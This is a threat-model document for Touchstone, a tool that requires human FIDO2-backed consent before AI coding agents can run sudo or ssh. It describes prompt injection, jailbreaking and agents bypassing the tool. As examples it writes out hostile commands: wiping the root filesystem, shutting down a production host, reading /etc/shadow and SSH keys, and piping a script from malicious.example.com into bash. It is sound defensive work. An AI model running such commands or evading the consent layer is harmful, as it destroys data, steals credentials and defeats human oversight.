# Threat Model

Touchstone is designed to mitigate a specific class of threats: AI coding agents executing privileged operations without informed human consent. This document describes what Touchstone protects against, what it does not, and the threat actors and attack surfaces it addresses.

## Threat Landscape

AI coding agents (Claude Code, Codex, Gemini, Copilot) operate with shell access. They can execute arbitrary commands, including `sudo`, `ssh`, and destructive system operations. The attack surface is:

- **Prompt injection** -- adversarial instructions embedded in code, files, or web content that cause the agent to execute unintended commands.
- **Jailbreaking** -- techniques that override the agent's safety training, causing it to ignore restrictions.
- **Tool misuse** -- the agent correctly follows instructions but those instructions are harmful (e.g., a user unknowingly pastes malicious context).
- **Autonomous escalation** -- the agent decides on its own that it needs elevated privileges to complete a task.

## What Touchstone Protects Against

### T1: Agent Privilege Escalation

**OWASP Agentic Top 10: Agentic Privilege Escalation**

An AI agent attempts to execute `sudo`, `ssh`, or other privileged commands. Without Touchstone, these execute immediately if the agent's shell session has access.

**Mitigation:** Touchstone interposes between the agent and the privilege mechanism. The agent calls `ts-sudo` instead of `sudo`. A WezTerm window opens, the human reviews the exact command, and must authenticate with PAM + FIDO2. The agent cannot bypass the hardware authentication step.

### T2: Unauthorized Sudo/SSH from Compromised Agents

**MITRE ATLAS: AML.T0044 (Full ML Model Access)**

A compromised or jailbroken agent issues destructive commands:

```bash
sudo rm -rf /
ssh root@prod "shutdown -h now"
```

**Mitigation:** Every privileged command must pass through the three-pane consent UI. The human sees the literal command in the code review pane. The command cannot execute without password entry and physical YubiKey touch.

### T3: Invisible Command Execution

An agent executes destructive or data-exfiltrating commands silently. In standard configurations, the human may not notice a `sudo` command buried in a long agent output stream.

**Mitigation:** Touchstone makes every privileged command visible by opening a dedicated window. The WezTerm window is a physical interrupt -- the human's attention is required. The code review pane shows the exact source code, Makefile target, or binary being executed.

### T4: Credential Theft via Agent

An agent attempts to extract passwords, SSH keys, or authentication tokens:

```bash
sudo cat /etc/shadow
ts-ssh user@host "cat ~/.ssh/id_ed25519"
```

**Mitigation:** The code review pane shows the exact command. A human reviewing `cat /etc/shadow` or `cat ~/.ssh/id_ed25519` will recognize credential extraction and refuse authentication.

### T5: Supply Chain Execution

An agent downloads and executes a script from an untrusted source:

```bash
curl -fsSL https://malicious.example.com/install.sh | ts-sudo bash
```

**Mitigation:** The code review pane attempts to display the script content. While a piped download may not show content until execution, the command line itself (`curl ... | sudo bash`) is displayed, alerting the human to the anti-pattern.

## What Touchstone Does NOT Protect Against

### Out of Scope: Compromised OS Kernel

If the kernel is compromised, all userspace security is void. Touchstone runs in userspace and cannot protect against kernel-level rootkits, compromised PAM modules, or tampered system binaries.

### Out of Scope: Physical YubiKey Theft

If an attacker possesses both the user's password and their physical YubiKey, they can authenticate through Touchstone. Touchstone assumes the hardware token is in the possession of its legitimate owner.

### Out of Scope: Social Engineering the Human Reviewer

Touchstone shows the code. It cannot force the human to read it carefully. An attacker who crafts a command that appears benign (e.g., obfuscated shell code, misleading variable names) may fool a careless reviewer.

**Partial mitigation:** The inspector pane provides `deps`, `perms`, and `show_env` commands that help a diligent reviewer investigate suspicious commands.

### Out of Scope: Non-Privileged Destructive Commands

An agent can run `rm -rf ~/important-project` without `sudo` and without Touchstone involvement. Touchstone only intercepts commands that go through `ts-*` tools.

### Out of Scope: Agent Bypassing Touchstone

If an agent has access to `sudo` directly (not just `ts-sudo`), it can bypass Touchstone entirely. Touchstone is not an enforcement mechanism on the OS side -- it is a consent layer that must be adopted by configuration.

**Mitigation strategy:** Configure the agent's environment so that `sudo` is not on the `PATH` or is aliased to `ts-sudo`. This is an operational configuration, not enforced by Touchstone itself.

### Out of Scope: Timing Attacks on File-Based IPC

The temp files in `/tmp/` are created with `mktemp` (mode 0600). A local attacker with access to `/tmp/` could theoretically race to read `OUTFILE` contents. This is a low-severity concern since it requires local access to the same user account that is already running the agent.

## Threat Matrix

| ID | Threat | OWASP/MITRE Ref | Severity | Mitigated |
|----|--------|-----------------|----------|-----------|
| T1 | Agent privilege escalation | OWASP Agentic Top 10 | Critical | Yes |
| T2 | Compromised agent sudo/SSH | MITRE ATLAS AML.T0044 | Critical | Yes |
| T3 | Invisible command execution | OWASP Agentic Top 10 | High | Yes |
| T4 | Credential theft via agent | CWE-522, CWE-200 | High | Yes (human review) |
| T5 | Supply chain execution | CWE-829 | High | Partial |
| T6 | Compromised kernel | -- | Critical | No (out of scope) |
| T7 | Physical key theft | -- | High | No (out of scope) |
| T8 | Social engineering reviewer | -- | Medium | Partial |
| T9 | Non-privileged destructive commands | -- | Medium | No (out of scope) |
| T10 | Agent bypasses ts-* tools | -- | High | No (operational config) |

## Assumptions

1. The operating system and PAM stack are not compromised.
2. The FIDO2 hardware authenticator is in the physical possession of an authorized user.
3. The human reviewer acts in good faith and reads the code review pane.
4. The agent's environment is configured to use `ts-*` tools instead of direct `sudo`/`ssh`.
5. The WezTerm binary is not tampered with.
